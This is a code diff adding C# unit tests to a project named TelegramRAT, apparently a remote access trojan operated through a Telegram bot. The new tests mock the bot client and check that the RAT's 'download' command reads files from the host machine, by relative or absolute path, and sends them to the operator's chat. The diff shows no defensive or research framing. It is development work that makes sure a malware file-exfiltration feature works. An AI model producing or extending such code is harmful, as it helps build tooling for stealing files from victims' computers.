@@ -13,6 +13,7 @@ using Telegram.Bot.Requests;
 using Telegram.Bot.Requests.Abstractions;
 using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
+using Telegram.Bot.Types.InputFiles;
 using TelegramRAT;
 using TelegramRAT.Commands;
 using Xunit;
@@ -21,7 +22,9 @@ namespace TelegramRAT.Tests;
 
 public class CommandRegistryTests
 {
-    private static Mock<ITelegramBotClient> CreateBotMock(List<string> sentMessages)
+    private static Mock<ITelegramBotClient> CreateBotMock(
+        List<string> sentMessages,
+        List<SendDocumentRequest>? sentDocuments = null)
     {
         var botMock = new Mock<ITelegramBotClient>(MockBehavior.Strict);
 
@@ -39,6 +42,9 @@ public class CommandRegistryTests
                             Chat = new Chat { Id = messageRequest.ChatId.Identifier ?? 0 }
                         });
                     case SendDocumentRequest:
+                        if (sentDocuments != null)
+                            sentDocuments.Add((SendDocumentRequest)request);
+                        return Task.FromResult(new Message { MessageId = 1 });
                     case SendVoiceRequest:
                         return Task.FromResult(new Message { MessageId = 1 });
                     default:
@@ -183,6 +189,91 @@ public class CommandRegistryTests
             Assert.True(string.Equals(expectedDirectory, actualDirectory, comparison));
             Assert.Single(sentMessages);
             Assert.Contains(expectedDirectory, sentMessages[0]);
+        }
+        finally
+        {
+            Directory.SetCurrentDirectory(originalDirectory);
+
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task DownloadCommand_WithRelativePath_SendsFileFromCurrentDirectory()
+    {
+        var sentMessages = new List<string>();
+        var sentDocuments = new List<SendDocumentRequest>();
+        var botMock = CreateBotMock(sentMessages, sentDocuments);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "download");
+
+        var originalDirectory = Directory.GetCurrentDirectory();
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        var targetDirectory = Path.Combine(tempRoot, "nested");
+        var fileName = "relative.txt";
+        var relativePath = Path.Combine("nested", fileName);
+        Directory.CreateDirectory(targetDirectory);
+        var fullPath = Path.Combine(targetDirectory, fileName);
+        await File.WriteAllTextAsync(fullPath, "content");
+
+        try
+        {
+            Directory.SetCurrentDirectory(tempRoot);
+
+            var model = CreateModel("download", new[] { relativePath });
+
+            await command.Execute(model);
+
+            Assert.Empty(sentMessages);
+            var documentRequest = Assert.Single(sentDocuments);
+            var inputFile = Assert.IsType<InputFileStream>(documentRequest.Document);
+            var fileStream = Assert.IsType<FileStream>(inputFile.Content);
+            Assert.Equal(Path.GetFullPath(fullPath), Path.GetFullPath(fileStream.Name));
+        }
+        finally
+        {
+            Directory.SetCurrentDirectory(originalDirectory);
+
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task DownloadCommand_WithAbsolutePath_SendsFile()
+    {
+        var sentMessages = new List<string>();
+        var sentDocuments = new List<SendDocumentRequest>();
+        var botMock = CreateBotMock(sentMessages, sentDocuments);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "download");
+
+        var originalDirectory = Directory.GetCurrentDirectory();
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        Directory.CreateDirectory(tempRoot);
+        var filePath = Path.Combine(tempRoot, "absolute.txt");
+        await File.WriteAllTextAsync(filePath, "content");
+
+        try
+        {
+            Directory.SetCurrentDirectory(originalDirectory);
+
+            var model = CreateModel("download", new[] { filePath });
+
+            await command.Execute(model);
+
+            Assert.Empty(sentMessages);
+            var documentRequest = Assert.Single(sentDocuments);
+            var inputFile = Assert.IsType<InputFileStream>(documentRequest.Document);
+            var fileStream = Assert.IsType<FileStream>(inputFile.Content);
+            Assert.Equal(Path.GetFullPath(filePath), Path.GetFullPath(fileStream.Name));
         }
         finally
         {
